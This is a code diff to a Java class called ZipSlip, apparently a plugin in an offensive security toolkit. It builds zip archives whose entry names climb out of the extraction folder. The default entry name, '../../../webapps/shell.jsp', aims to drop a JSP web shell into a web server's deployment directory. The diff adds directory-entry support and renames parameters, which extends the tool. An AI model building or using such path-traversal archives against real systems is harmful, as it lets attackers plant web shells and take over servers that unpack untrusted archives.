@@ -8,6 +8,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class ZipSlip implements IHelper{
+    private final static String COMPRESS_TYPE_DIR = "DIR";
     private IResultOutput resultOutput;
 
     public String getHelperTabCaption() {
@@ -25,7 +26,7 @@ public class ZipSlip implements IHelper{
         args.add(args1);
 
         IArg compressName = ZipTools.pluginHelper.createArg();
-        compressName.setName("compress_name_1");
+        compressName.setName("compress_file_name_1");
         compressName.setDefaultValue("../../../webapps/shell.jsp");
         compressName.setDescription("解压的路径");
         compressName.setRequired(true);
@@ -47,12 +48,19 @@ public class ZipSlip implements IHelper{
         ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(saveFile));
         zipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
         for(Map.Entry<String,String> un:unm.entrySet()){
-            String compressName = un.getKey();
+            String compressName = un.getKey();//.replace("\\","/");
             String filePath = un.getValue();
-            zipOutputStream.putNextEntry(new ZipEntry(compressName));
-            zipOutputStream.write(FileUtil.readFile(filePath));
-            zipOutputStream.flush();
-            this.resultOutput.infoPrintln(String.format("Compress %s to %s finish",filePath,compressName));
+            if(filePath.equals(COMPRESS_TYPE_DIR)){
+                String dirName = compressName.endsWith("/") || compressName.endsWith("\\") ? compressName : compressName + "/";
+                zipOutputStream.putNextEntry(new ZipEntry(dirName));
+                zipOutputStream.flush();
+                this.resultOutput.infoPrintln(String.format("Compress dir  %s finish",compressName));
+            }else{
+                zipOutputStream.putNextEntry(new ZipEntry(compressName));
+                zipOutputStream.write(FileUtil.readFile(filePath));
+                zipOutputStream.flush();
+                this.resultOutput.infoPrintln(String.format("Compress file %s to %s finish",filePath,compressName));
+            }
         }
         zipOutputStream.close();
     }
@@ -62,10 +70,21 @@ public class ZipSlip implements IHelper{
         this.resultOutput = resultOutput;
         LinkedHashMap<String,String> cus = new LinkedHashMap<String, String>();
         for(int i= 0;i<customArgs.size();i++){
-            String cFileName = String.format("compress_name_%s",i+1);
-            String cFile = String.format("compress_file_%s",i+1);
-            if(customArgs.get(cFileName) != null && customArgs.get(cFile) != null){
-                cus.put((String)customArgs.get(cFileName),(String)customArgs.get(cFile));
+            String compressDirName = String.format("compress_dir_name_%d",i+1);
+            String compressFileName = String.format("compress_file_name_%d",i+1);
+            String compressFile = String.format("compress_file_%d",i+1);
+
+            if(customArgs.get(compressDirName) != null && customArgs.get(compressFileName) != null){
+                resultOutput.errorPrintln(String.format("The serial number of %s and %s cannot be the same",compressDirName,compressFileName));
+                return;
+            }
+
+            if(customArgs.get(compressFileName) != null && customArgs.get(compressFile) != null){
+                cus.put((String)customArgs.get(compressFileName),(String)customArgs.get(compressFile));
+            }
+
+            if(customArgs.get(compressDirName) != null){
+                cus.put((String)customArgs.get(compressDirName),COMPRESS_TYPE_DIR);
             }
         }
 
